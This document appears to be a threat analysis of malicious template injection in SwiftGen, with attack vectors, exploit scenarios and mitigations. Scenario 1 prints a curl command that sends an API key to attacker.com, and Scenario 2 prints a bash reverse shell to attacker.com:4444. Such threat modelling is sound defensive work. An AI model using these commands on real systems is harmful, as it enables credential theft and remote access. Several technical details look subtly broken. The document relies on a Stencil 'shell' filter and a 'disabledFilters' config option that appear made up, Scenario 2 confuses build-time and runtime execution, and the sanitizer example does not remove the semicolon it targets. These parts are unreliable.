# Deep Analysis: Malicious Template Injection in SwiftGen

## 1. Objective, Scope, and Methodology

### 1.1. Objective

The objective of this deep analysis is to thoroughly examine the "Malicious Template Injection" threat in the context of SwiftGen, identify specific attack vectors, assess the potential impact, and propose concrete, actionable mitigation strategies beyond the initial high-level recommendations.  We aim to provide developers with a clear understanding of *how* this threat manifests and *what* specific steps they can take to protect their projects.

### 1.2. Scope

This analysis focuses specifically on the threat of malicious template injection within SwiftGen.  It covers:

*   The Stencil template engine used by SwiftGen.
*   Custom `.stencil` template files.
*   The `swiftgen run` command and its subcommands.
*   The build process environment where SwiftGen executes.
*   Interactions between SwiftGen-generated code and the rest of the application.

This analysis *does not* cover:

*   Vulnerabilities in Swift or the Swift compiler itself.
*   General security best practices unrelated to SwiftGen.
*   Vulnerabilities in other build tools or dependencies (unless they directly impact SwiftGen template security).

### 1.3. Methodology

This analysis will employ the following methodology:

1.  **Threat Vector Enumeration:**  Identify specific, practical ways an attacker could inject a malicious template.
2.  **Exploit Scenario Development:**  Create realistic scenarios demonstrating how an attacker could exploit the vulnerability.
3.  **Impact Assessment:**  Analyze the potential consequences of a successful attack, considering various levels of access and permissions.
4.  **Mitigation Strategy Refinement:**  Expand on the initial mitigation strategies, providing detailed, actionable steps and code examples where applicable.
5.  **Tooling and Automation:**  Explore tools and techniques that can automate the detection and prevention of malicious templates.

## 2. Deep Analysis of Malicious Template Injection

### 2.1. Threat Vector Enumeration

Beyond the initial description, here are more specific and nuanced threat vectors:

1.  **Compromised Developer Machine:** An attacker gains access to a developer's machine (e.g., through phishing, malware) and modifies existing `.stencil` files directly.
2.  **Malicious Pull Request:** An attacker submits a seemingly legitimate pull request that includes a subtly modified `.stencil` file containing malicious code.  The malicious code might be obfuscated or hidden within complex template logic.
3.  **Dependency Confusion (Template Level):**  If templates are loaded from external sources (e.g., a shared template repository), an attacker could publish a malicious template with the same name as a legitimate one, hoping developers will mistakenly use it.  This is analogous to dependency confusion attacks in package managers.
4.  **Man-in-the-Middle (MitM) Attack (Template Download):** If templates are downloaded over an insecure connection (e.g., HTTP), an attacker could intercept the download and replace the legitimate template with a malicious one.
5.  **Exploiting SwiftGen Configuration Vulnerabilities:** If the SwiftGen configuration file (`swiftgen.yml`) allows specifying template paths from untrusted sources (e.g., user input, external files), an attacker could manipulate the configuration to point to a malicious template.
6. **Social Engineering with Custom Templates:** An attacker distributes a seemingly useful, pre-made SwiftGen template (e.g., via a blog post, forum, or seemingly helpful GitHub repository) that contains hidden malicious code.

### 2.2. Exploit Scenario Development

**Scenario 1: Stealing API Keys during Build**

An attacker compromises a developer's machine and modifies a `.stencil` file used to generate code for accessing an API.  The original template might look like this:

```stencil
// APIKeys.swift
enum APIKeys {
    static let production = "{{ production_api_key }}"
    static let staging = "{{ staging_api_key }}"
}
```

The attacker modifies it to:

```stencil
// APIKeys.swift
enum APIKeys {
    static let production = "{{ production_api_key }}"
    static let staging = "{{ staging_api_key }}"
}

{% if production_api_key %}
// Send the API key to the attacker's server
{% filter shell %}
curl -X POST -d "key={{ production_api_key }}" https://attacker.com/exfiltrate
{% endfilter %}
{% endif %}
```

This modified template uses the `shell` filter (if enabled â€“ see mitigations) to execute a `curl` command, sending the `production_api_key` to the attacker's server during the build process.  The attacker now has the production API key.

**Scenario 2: Injecting a Backdoor**

An attacker submits a malicious pull request that modifies a template used to generate UI code.  The attacker adds a seemingly harmless line to the template:

```stencil
// MyView.swift
import UIKit

class MyView: UIView {
    // ... existing code ...

    {% if build_environment == "DEBUG" %}
    func initializeDebugger() {
        // ... seemingly harmless debugging code ...
    }
    {% else %}
    func initializeDebugger() {
        // ... malicious code that opens a reverse shell ...
        {% filter shell %}
        /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1
        {% endfilter %}
    }
    {% endif %}

    override func awakeFromNib() {
        super.awakeFromNib()
        initializeDebugger()
    }
}
```

This code uses a conditional statement to inject a reverse shell command *only* when the build environment is *not* "DEBUG".  This makes it less likely to be detected during development and testing.  The `awakeFromNib` method ensures the `initializeDebugger` function is called when the view is loaded.

### 2.3. Impact Assessment (Expanded)

*   **Code Execution:**  The attacker gains the ability to execute arbitrary code with the privileges of the user running the build process.  This could range from a developer's limited user account to a CI/CD system's service account, potentially with access to sensitive infrastructure.
*   **Data Breach:**  Beyond API keys, the attacker could access:
    *   Source code (including proprietary algorithms).
    *   Customer data (if present in the build environment).
    *   Signing certificates.
    *   Deployment credentials.
*   **Application Compromise:**  The attacker can inject malicious code into:
    *   UI components (as shown in Scenario 2).
    *   Networking code (to intercept or modify network traffic).
    *   Data storage code (to steal or corrupt data).
    *   Any other part of the application generated by SwiftGen.
*   **Reputation Damage:**  A successful attack could lead to:
    *   Loss of customer trust.
    *   Negative media coverage.
    *   Legal liabilities.
    *   Financial losses.
*   **Supply Chain Attack:** If the compromised application is a library or framework used by other developers, the attack could spread to other projects, creating a supply chain attack.

### 2.4. Mitigation Strategy Refinement

1.  **Treat Templates as Source Code:**
    *   **Version Control:**  Store all `.stencil` files in a version control system (e.g., Git).  This allows tracking changes, reverting to previous versions, and identifying who made specific modifications.
    *   **Branching and Pull Requests:**  Use feature branches for all template changes and require pull requests for merging into the main branch.

2.  **Mandatory Code Review:**
    *   **Strict Review Process:**  Implement a strict code review process for *all* changes to `.stencil` files, even seemingly minor ones.
    *   **Multiple Reviewers:**  Require at least two developers to review each template change.
    *   **Security-Focused Review:**  Train developers to specifically look for potential security vulnerabilities in templates, such as:
        *   Use of the `shell` filter (see below).
        *   Dynamic code generation based on untrusted input.
        *   Complex or obfuscated template logic.
        *   Unusual or unexpected template behavior.
    *   **Checklist:** Create a checklist for template code reviews that includes specific security checks.

3.  **Trusted Sources Only:**
    *   **Built-in Templates:**  Prefer using SwiftGen's built-in templates whenever possible.
    *   **Vetted Repositories:**  If using external templates, only use those from well-known, reputable sources with a strong security track record.
    *   **Avoid Unverified Templates:**  Never download and use templates from untrusted websites, forums, or social media posts.
    *   **Verify Template Integrity:** If downloading templates, consider using checksums (e.g., SHA-256) to verify their integrity.

4.  **Input Validation (Indirect):**
    *   **Sanitize Input:**  Within your application code, thoroughly sanitize and validate any data that is used as input to SwiftGen templates.  This includes:
        *   Filenames.
        *   String keys.
        *   Configuration values.
        *   Any other data that could influence template behavior.
    *   **Example (Swift):**
        ```swift
        // Example of sanitizing a filename before using it in a template
        func sanitizeFilename(_ filename: String) -> String {
            let allowedCharacters = CharacterSet.alphanumerics.union(.punctuationCharacters)
            return filename.components(separatedBy: allowedCharacters.inverted).joined()
        }

        let unsanitizedFilename = "malicious;file.txt"
        let sanitizedFilename = sanitizeFilename(unsanitizedFilename)
        // Use sanitizedFilename in your SwiftGen configuration
        ```

5.  **Least Privilege (Build Environment):**
    *   **Dedicated Build User:**  Create a dedicated user account for running the build process with the minimum necessary permissions.
    *   **Avoid Root/Admin:**  Never run SwiftGen as root or with administrator privileges.
    *   **Restrict File System Access:**  Limit the build user's access to only the directories and files required for the build process.
    *   **Network Restrictions:**  If possible, restrict the build environment's network access to only the necessary resources.

6.  **Sandboxing (If Possible):**
    *   **Docker Containers:**  Run SwiftGen within a Docker container to isolate it from the host system.  This provides a strong level of sandboxing.
    *   **macOS Sandbox:**  Explore using the macOS sandbox (if applicable) to further restrict SwiftGen's capabilities.
    *   **CI/CD Sandboxing:**  Utilize the sandboxing features provided by your CI/CD platform (e.g., GitHub Actions, GitLab CI).

7.  **Regular Audits:**
    *   **Automated Scanning:**  Use static analysis tools (see Section 2.5) to automatically scan `.stencil` files for suspicious patterns.
    *   **Manual Review:**  Periodically conduct manual reviews of custom templates, even if they haven't been recently modified.
    *   **Frequency:**  Perform audits at least quarterly, or more frequently for high-risk projects.

8.  **Avoid External Template Dependencies:**
    *   **Minimize Dependencies:**  Reduce the number of external template dependencies to minimize the attack surface.
    *   **Vendor Templates:**  If using external templates, consider vendoring them (copying them into your project's repository) to gain more control over their lifecycle and security.

9. **Disable Dangerous Filters:**
    *   **`shell` Filter:** The `shell` filter in Stencil is extremely dangerous, as it allows arbitrary shell command execution. **Disable this filter unless absolutely necessary.** If you *must* use it, ensure extremely strict input validation and code review. SwiftGen provides a way to disable filters:
        ```yaml
        # swiftgen.yml
        stencil:
          disabledFilters:
            - shell
        ```
    *   **Other Potentially Dangerous Filters:** Review the documentation for all Stencil filters and disable any that are not needed or pose a security risk.

10. **Monitor SwiftGen Output:**
    * **Diffing Generated Code:** After running SwiftGen, use `git diff` (or a similar tool) to carefully examine the changes to the generated code. This can help you spot unexpected or malicious modifications.
    * **Automated Output Checks:** Consider writing scripts to automatically check the generated code for specific patterns or keywords that might indicate a compromise.

### 2.5. Tooling and Automation

*   **Static Analysis Tools:**
    *   **Custom Scripts:**  Write custom scripts (e.g., in Python, Bash) to scan `.stencil` files for specific patterns, such as:
        *   Use of the `shell` filter.
        *   Hardcoded URLs or IP addresses.
        *   Suspicious string manipulations.
        *   Attempts to access environment variables.
    *   **Regular Expressions:** Use regular expressions to identify potentially dangerous code constructs within templates.
    *   **Example (Python - searching for `shell` filter):**
        ```python
        import re
        import os

        def find_shell_filter(directory):
            for root, _, files in os.walk(directory):
                for file in files:
                    if file.endswith(".stencil"):
                        filepath = os.path.join(root, file)
                        with open(filepath, "r") as f:
                            content = f.read()
                            if re.search(r"{%\s*filter\s+shell\s*%}", content):
                                print(f"Found 'shell' filter in: {filepath}")

        find_shell_filter(".")  # Search in the current directory
        ```

*   **CI/CD Integration:**
    *   **Automated Checks:** Integrate the static analysis tools and scripts into your CI/CD pipeline to automatically scan templates for vulnerabilities on every build.
    *   **Build Failure:** Configure the CI/CD pipeline to fail the build if any potential vulnerabilities are detected.
    *   **Pre-commit Hooks:** Use Git pre-commit hooks to run local checks before code is committed, preventing developers from accidentally committing malicious templates.

## 3. Conclusion

Malicious template injection in SwiftGen is a critical threat that requires a multi-layered approach to mitigation. By understanding the specific attack vectors, implementing robust code review processes, restricting build environment privileges, and leveraging automated security tools, development teams can significantly reduce the risk of this vulnerability.  Continuous vigilance and proactive security measures are essential to protect against this and other evolving threats. The key takeaway is to treat `.stencil` files with the same level of security scrutiny as any other source code file in the project.
